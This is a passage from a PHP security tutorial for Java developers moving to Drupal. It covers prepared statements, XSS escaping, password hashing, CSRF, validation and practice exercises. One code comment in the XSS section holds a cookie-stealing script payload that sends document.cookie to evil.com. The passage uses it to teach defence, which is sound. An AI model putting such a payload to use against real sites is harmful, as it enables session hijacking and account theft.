$stmt = $pdo->prepare("SELECT * FROM users WHERE name = ?");
$stmt->execute([$_GET['name']]);
// The input is treated as data, never as SQL code
```

**Real-life analogy:** Imagine you go to a bank and fill out a withdrawal slip. The
bank teller reads the amount you wrote. SQL injection is like writing "Rs. 500; also
transfer all money from all accounts to mine" on the slip — and the teller following
it literally! Prepared statements are like the bank having a fixed form where the
amount goes in a specific box, and the teller ignores anything written outside the box.

**Java comparison:** Same concept — use `PreparedStatement` instead of string
concatenation:
```java
// SAFE
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE name = ?");
stmt.setString(1, userInput);
```

### XSS (Cross-Site Scripting)

An attacker injects JavaScript through user input that gets displayed on your page.

```php
<?php

// VULNERABLE
$name = $_GET['name'];  // User provides: <script>alert('hacked')</script>
echo "Welcome, $name";
// The script EXECUTES in every visitor's browser!

// An attacker could steal session cookies:
// <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

// SAFE — escape all output with htmlspecialchars()
$name = $_GET['name'];
echo "Welcome, " . htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
// Now it displays as text: Welcome, &lt;script&gt;alert('hacked')&lt;/script&gt;
```

**Rule:** Every piece of user-provided data that you display in HTML MUST go through
`htmlspecialchars()`. No exceptions.

Drupal handles this automatically in Twig templates (auto-escaping), but in custom
PHP code you must do it yourself.

### Password Hashing

Never store passwords in plain text. Never use MD5 or SHA1 for passwords. Use PHP's
built-in `password_hash()` and `password_verify()`:

```php
<?php

// Creating a new user — HASH the password
$password = 'MySecurePassword123!';
$hashedPassword = password_hash($password, PASSWORD_DEFAULT);
// $hashedPassword = "$2y$10$YQ5..." (long bcrypt hash)

// Store $hashedPassword in the database (NOT the plain password!)

// Verifying a login — compare against the hash
$loginPassword = $_POST['password'];
$storedHash = $row['password'];  // From database

if (password_verify($loginPassword, $storedHash)) {
    echo "Login successful!";
    // Start session, set user, redirect
} else {
    echo "Invalid password.";
}
```

**Why not MD5/SHA1?**
```php
// NEVER use these for passwords!
$hash = md5($password);     // Can be cracked in seconds with rainbow tables
$hash = sha1($password);    // Same problem — too fast, easily brute-forced

// password_hash() uses bcrypt which is intentionally SLOW
// Making each guess take ~100ms makes brute-force attacks impractical
```

**Java comparison:**
```java
// Java uses BCrypt from Spring Security or jBCrypt library
String hashed = BCrypt.hashpw(password, BCrypt.gensalt());
boolean matches = BCrypt.checkpw(loginPassword, hashed);
```

### CSRF Protection (Recap)

See the Forms section above for the full CSRF token implementation. Key points:
- Generate a random token, store in session
- Include the token as a hidden form field
- Verify the token on form submission
- Regenerate after each use

### Input Validation Best Practices

```php
<?php

// Validate AND sanitize ALL user input
function validateRegistration(array $data): array {
    $errors = [];

    // Name — required, letters and spaces only, reasonable length
    $name = trim($data['name'] ?? '');
    if (empty($name)) {
        $errors[] = "Name is required";
    } elseif (!preg_match('/^[a-zA-Z\s]{2,100}$/', $name)) {
        $errors[] = "Name must be 2-100 characters, letters and spaces only";
    }

    // Email — required, must be valid format
    $email = trim($data['email'] ?? '');
    if (empty($email)) {
        $errors[] = "Email is required";
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $errors[] = "Invalid email format";
    }

    // Age — optional, must be valid integer in range
    if (!empty($data['age'])) {
        $age = filter_var($data['age'], FILTER_VALIDATE_INT, [
            'options' => ['min_range' => 13, 'max_range' => 120]
        ]);
        if ($age === false) {
            $errors[] = "Age must be between 13 and 120";
        }
    }

    // Phone — optional, Indian format
    if (!empty($data['phone'])) {
        if (!preg_match('/^[6-9]\d{9}$/', $data['phone'])) {
            $errors[] = "Invalid phone number (must be 10 digits starting with 6-9)";
        }
    }

    return $errors;
}
```

### Security Checklist

| Threat | Prevention |
|--------|-----------|
| SQL Injection | Always use prepared statements with PDO |
| XSS | Always use `htmlspecialchars()` on output |
| CSRF | Use tokens in forms |
| Password theft | Use `password_hash()` / `password_verify()` |
| Session hijacking | Use HTTPS, `session_regenerate_id()` on login |
| File upload abuse | Validate MIME type, limit size, rename files |
| Directory traversal | Never use user input in file paths directly |
| HTTP header injection | Validate/sanitize values before `header()` |

### Drupal and Security

Drupal handles most of these automatically:
- **SQL injection** — Drupal's Database API uses parameterized queries
- **XSS** — Twig templates auto-escape output
- **CSRF** — Drupal's Form API includes CSRF tokens
- **Passwords** — Drupal uses its own password hashing system
- **Sessions** — Drupal uses database-backed, secure sessions
- **File uploads** — Drupal validates and sanitizes uploaded files

But for any custom PHP code you write in Drupal modules, YOU are responsible for
following these security practices.

---

## 8. Putting It All Together — Mini Project

Build a simple "Student Management System" that combines everything from all four
weeks. This is your capstone project before starting Drupal.

### Project Requirements

1. **Database:** students table with id, name, email, city, marks (JSON), created_at
2. **List page:** Show all students with pagination
3. **Detail page:** Show one student's full information
4. **Add form:** Form to add a new student with validation
5. **Edit form:** Form to edit an existing student
6. **Delete:** Delete a student with confirmation
7. **API:** JSON API endpoints for all CRUD operations
8. **Search:** Search by name or city

### Suggested Structure

```
student-app/
├── public/
│   └── index.php          ← Front controller
├── src/
│   ├── Controllers/
│   │   ├── StudentController.php
│   │   └── ApiController.php
│   ├── Models/
│   │   └── Student.php
│   └── Views/
│       ├── layout.php
│       └── students/
│           ├── list.php
│           ├── show.php
│           ├── create.php
│           └── edit.php
├── config/
│   └── database.php
├── composer.json
└── schema.sql
```

This project exercises:
- Week 1: Variables, arrays, strings, loops, functions
- Week 2: Classes, constructors, namespaces, type hints
- Week 3: Error handling, JSON, sessions (for flash messages), file handling (CSV export)
- Week 4: HTTP, forms, PDO, MVC, security, Composer

---

## 9. Practice Exercises

### Exercise 1: Contact Form
Build a contact form that:
- Collects name, email, subject, and message
- Validates all fields server-side
- Prevents CSRF attacks with tokens
- Shows success message after submission
- Stores messages in a JSON file (or database)

### Exercise 2: REST API
Build a complete REST API for a "Products" resource:
- `GET /api/products` — list all products (with optional ?category=X filter)
- `GET /api/products/42` — get one product
- `POST /api/products` — create a product (validate JSON input)
- `PUT /api/products/42` — update a product
- `DELETE /api/products/42` — delete a product
- All responses should be JSON with appropriate status codes
- Test with curl

### Exercise 3: Login System
Build a simple login/registration system:
- Registration form (name, email, password, confirm password)
- Passwords stored with `password_hash()`
- Login form (email + password)
- Login verified with `password_verify()`
- Session-based authentication
- Protected dashboard page (redirects to login if not authenticated)
- Logout functionality (destroys session)

### Exercise 4: Database CRUD
Create a "Task Manager" with PDO:
- Tasks table: id, title, description, status (pending/in_progress/completed),
  priority (low/medium/high), due_date, created_at
- List tasks with filters (status, priority)
- Create, update, delete tasks
- Mark tasks as completed
- Sort by due date or priority
- Use transactions when updating multiple tasks at once

### Exercise 5: Composer Package Usage
Create a project that uses Composer packages:
- Use `guzzlehttp/guzzle` to fetch data from a public API
- Use `monolog/monolog` for logging
- Use `vlucas/phpdotenv` for environment variables
- Write a `.env` file with database credentials
- Set up PSR-4 autoloading for your own classes

### Exercise 6: File-Based Blog
Build a simple blog where:
- Posts are stored as Markdown files in a `posts/` directory
- The filename is the slug: `my-first-post.md`
- The first line is the title, second line is the date
- List page shows all posts sorted by date
- Detail page renders the Markdown as HTML
- Admin page for creating new posts (with CSRF protection)
- Bonus: Add categories using directory structure (`posts/tech/`, `posts/life/`)

### Exercise 7: Security Audit
Take your Student Management System from the mini project and:
- Try to perform SQL injection through the search form
- Try to inject XSS through the name field
- Try to submit the form without the CSRF token
- Try to upload a .php file through the file upload
- Document what you found and how the protections work

---

## Week 4 Summary — What You Have Learned

| Topic | Key Takeaway | Drupal Connection |
|-------|-------------|-------------------|
| HTTP | `$_GET`, `$_POST`, `header()`, status codes | Drupal uses Symfony's Request/Response |
| Forms | Validation, sanitization, CSRF tokens | Drupal Form API handles all of this |
| PDO | Prepared statements, CRUD, transactions | Drupal Database API wraps PDO |
| MVC | Models, Views, Controllers, routing | Drupal uses MVC (Entity/Twig/Controller) |
| Composer | Package management, autoloading | Drupal is entirely Composer-managed |
| REST | JSON APIs, HTTP methods, routing | Drupal REST module, JSON:API module |
| Security | SQL injection, XSS, CSRF, password hashing | Drupal handles most automatically |

---

## What Is Next — Starting Drupal

You now have a solid PHP foundation. Here is what Drupal builds on top of what you
have learned:

| PHP Concept | Drupal Equivalent |
|------------|-------------------|
| `$_GET`, `$_POST` | `\Drupal::request()->query->get()`, `request()->request->get()` |
| PDO queries | `\Drupal::database()->select()`, Entity API |
| `include` templates | Twig template engine |
| `session_start()` | Drupal session service (database-backed) |
| Manual routing | YAML routing files (`*.routing.yml`) |
| Manual DI | Service container (`*.services.yml`) |
| Raw HTML forms | Form API (array-based form definitions) |
| `composer require` | `composer require drupal/module_name` |
| Custom classes | Plugins, Services, Controllers, Events |
| MVC pattern | Entity (Model), Twig (View), Controller, Plugin |

**Your Java knowledge maps to Drupal like this:**

| Java / Spring Boot | Drupal |
|-------------------|--------|
| `@Controller` | `ControllerBase` class |
| `@Service` | Service class in `services.yml` |
| `@Repository` + JPA | Entity storage, Database API |
| `@Bean` / IoC | `services.yml` + service container |
| `@Autowired` | Constructor injection via `create()` |
| `application.properties` | `settings.php` + `*.settings.yml` |
| Thymeleaf templates | Twig templates |
| `pom.xml` / Gradle | `composer.json` |
| JUnit | PHPUnit |
| Spring Security | Drupal permission system + Form API |

You are now ready to start learning Drupal. The PHP concepts you have learned this
month are the foundation that everything in Drupal is built upon. When you encounter
something unfamiliar in Drupal, you can always fall back on these PHP fundamentals to
understand what is happening underneath.

---

## Quick Reference — Week 4 Functions

| Task | Function | Example |
|------|----------|---------|
| Read GET param | `$_GET['key']` | `$page = $_GET['page'] ?? 1` |
| Read POST data | `$_POST['key']` | `$name = $_POST['name'] ?? ''` |
| Read JSON body | `file_get_contents('php://input')` | `$data = json_decode(..., true)` |
| Set status code | `http_response_code($code)` | `http_response_code(404)` |
| Set header | `header($string)` | `header('Content-Type: application/json')` |
| Redirect | `header('Location: $url')` | `header('Location: /dashboard'); exit;` |
| DB connect | `new PDO($dsn, $user, $pass)` | See connection example above |
| Prepared query | `$pdo->prepare($sql)` | `$stmt->execute([$param])` |
| Fetch one row | `$stmt->fetch()` | Returns associative array or false |
| Fetch all rows | `$stmt->fetchAll()` | Returns array of arrays |
| Begin transaction | `$pdo->beginTransaction()` | Pair with commit() or rollBack() |
| Validate email | `filter_var($e, FILTER_VALIDATE_EMAIL)` | Returns email or false |
| Escape HTML | `htmlspecialchars($str)` | Prevents XSS attacks |
| Hash password | `password_hash($pw, PASSWORD_DEFAULT)` | Returns bcrypt hash |
| Verify password | `password_verify($pw, $hash)` | Returns true or false |
| Composer install | `composer install` | Installs all dependencies |
| Composer add | `composer require vendor/pkg` | Adds and installs a package |
